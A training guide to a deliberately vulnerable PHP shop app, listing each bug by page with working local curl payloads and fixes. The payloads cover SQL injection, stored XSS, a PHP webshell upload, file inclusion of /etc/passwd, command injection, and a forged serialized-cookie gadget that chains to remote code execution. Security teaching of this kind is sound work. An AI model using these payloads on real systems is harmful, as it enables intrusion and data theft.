# ShopEase (PHP) — Vulnerability Guide

**For authorized security testing / learning only. Run locally. Never deploy publicly or use real data.**

Same 5-page shop concept as the other editions, this time plain PHP + PDO/SQLite (classic LAMP-style, no framework) — so the PHP-specific classics show up: Local File Inclusion, Unrestricted File Upload, and PHP Object Injection, in addition to the SQLi/XSS/broken-access-control staples. Two of the bugs chain into full remote code execution, which is worth walking through end to end.

Demo accounts: `alice/alice123`, `bob/bobpass`, `admin/admin!2024`

---

## Page 1 — Login (`login.php`)
**SQL Injection (auth bypass) — CWE-89**
```
curl -X POST http://127.0.0.1:8081/login.php -d "username=admin' --&password=x"
```
**Insecure Deserialization / PHP Object Injection — CWE-502**
Checking "Remember me" sets a cookie that's just `base64(serialize($userArray))` — no HMAC, no signature. It's unserialized straight back on a later request (`includes/session_check.php`). Because `config.php` (loaded on every page) always defines a `Logger` class whose destructor does `file_put_contents($this->logFile, $this->logMsg, FILE_APPEND)` with both properties attacker-controlled, you can forge a cookie that writes an arbitrary PHP file anywhere writable the moment the request finishes:
```php
<?php
class Logger { public $logFile; public $logMsg; }
$o = new Logger();
$o->logFile = '/path/to/vulnapp-php/uploads/forged.php';
$o->logMsg  = '<?php echo shell_exec($_GET["c"]); ?>';
echo base64_encode(serialize($o));
```
```
curl --cookie "remember=<forged-value>" http://127.0.0.1:8081/login.php
curl "http://127.0.0.1:8081/admin.php?page=../uploads/forged.php&c=id"
```
**Fix:** sign tokens (HMAC) or use a random opaque token looked up server-side instead of serializing data into the cookie at all; never `unserialize()` client input (use `json_decode` instead, or `unserialize($str, ['allowed_classes' => false])` at minimum).

## Page 2 — Product search (`products.php`)
**SQL Injection (UNION-based) — CWE-89**
```
curl "http://127.0.0.1:8081/products.php?q=%27%20UNION%20SELECT%20id,username,password,email%20FROM%20users--"
```
**Fix:** `PDO::prepare()` with bound parameters, never string-interpolated SQL.

## Page 3 — Profile (`profile.php?id=`)
**IDOR — CWE-639**
No check that the logged-in session user matches `?id=`. Walk `?id=1`, `2`, `3` to read every user's SSN.
**Fix:** compare `$_SESSION['user_id']` to the requested id (or require admin role) before returning data.

## Page 4 — Product detail (`product.php?id=`)
**Stored XSS — CWE-79**
Comment body is echoed with zero escaping:
```
curl -X POST "http://127.0.0.1:8081/product.php?id=1" -d "action=comment&author=t&body=<script>alert(document.cookie)</script>"
```
**Unrestricted File Upload — CWE-434**
The "Upload a product photo" form trusts the client-supplied filename/extension outright and saves it straight into a web-reachable `uploads/` folder:
```
curl -X POST "http://127.0.0.1:8081/product.php?id=1" -F "avatar=@shell.php;filename=shell.php"
```
where `shell.php` contains e.g. `<?php echo shell_exec($_GET['c']); ?>`.
**Fix:** escape all output (`htmlspecialchars`), add a CSRF token to the comment form; for uploads, validate real content (not just the extension), re-encode images through a library, store outside the web root with a randomized name, and serve them through a controller that sets a safe `Content-Type`.

## Page 5 — Admin (`admin.php`)
**Broken access control — CWE-284**
Gated only by a client-supplied `is_admin` cookie that defaults to allow when absent — just visit the page, or set it in devtools.
**Local File Inclusion — CWE-98 / CWE-22**
```
curl "http://127.0.0.1:8081/admin.php?page=../../../../etc/passwd"
```
The real payoff is chaining this with the upload bug above — `include()` runs whatever PHP it's given, so including the uploaded shell executes it even though `uploads/` isn't meant to be a script-execution path:
```
curl "http://127.0.0.1:8081/admin.php?page=../uploads/shell.php&c=id"
# -> WEBSHELL_OK:uid=0(root) gid=0(root) ...
```
**OS command injection — CWE-78**
```
curl -X POST http://127.0.0.1:8081/admin.php -d "host=127.0.0.1; cat /etc/passwd"
```
**Fix:** real server-side role check from the session; for the page switcher, use an allowlist of known page keys mapped to fixed file paths (never pass user input to `include()`); for ping, avoid `shell_exec` string concatenation — validate the host against a strict pattern or use a library.

---

## The two RCE chains, start to finish
1. **Upload → LFI:** upload `shell.php` via the product page's photo form, then hit `admin.php?page=../uploads/shell.php&c=<command>`.
2. **Object injection → LFI:** forge a `remember` cookie that writes a PHP payload via the `Logger` gadget, send one request to trigger the write, then include it the same way.

Both land on the same `admin.php?page=` sink, which is a good illustration of why *any* single critical bug (the LFI) becomes much more dangerous once *any* way to place a file on disk exists elsewhere in the app, even in an "unrelated" feature.

## Also present throughout
- Verbose SQL error messages returned to the client (CWE-209).
- Plaintext password storage (CWE-256); SSNs returned by multiple endpoints (CWE-359).
- No CSRF tokens anywhere (CWE-352).
- `uploads/` and `pages/` have no `.htaccess`/web-server hardening restricting execution or directory listing.
